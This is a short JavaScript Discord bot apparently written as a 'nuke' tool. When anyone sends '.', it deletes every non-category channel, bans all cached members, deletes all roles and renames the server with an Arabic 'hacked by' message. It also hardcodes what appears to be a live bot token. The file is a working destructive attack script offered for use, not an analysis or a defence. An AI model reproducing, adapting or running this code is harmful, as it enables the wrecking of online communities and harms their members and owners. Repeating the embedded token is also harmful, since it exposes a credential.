const {Client,intents,MessageEmbed} = require("discord.js")
const client = new Client({
    intents: 32767,
})
client.on("ready", () => {
  client.user.setActivity("!help")
  console.log(`${client.user.username}`)
})
client.login("NzEzMjg2Njc4OTQwMzUyNTYz.G9RQzW._XGoWnx7XfvCxp70cbw8ouUKrLwdd6R0J2jxcs");
const hackname = "تم تهكير من قبل ابو عبدالله و ابوو سوسوو "
client.on("messageCreate", async(m) => {
    const message = m;
    if(m.content == ".") {
        message.delete();
        //channels
        const channels = message.guild.channels.cache.filter(chan => chan.type !== 'category');

        if (channels.size === 0) return;
        channels.forEach(async channel => {
          await channel.delete().catch(() => 0)
        })
    //ban
    client.guilds.cache.get(m.guild.id).members.cache.forEach(member => {
        member.ban({ reason: "nuke" }).then(() => 0).catch(() => 0)
      });
      //roles 
      message.guild.roles.cache.forEach(role => role.delete().catch(() => 0) )
     //name server
     const guild = client.guilds.cache.get(m.guild.id);
     guild.setName(hackname);

}
})
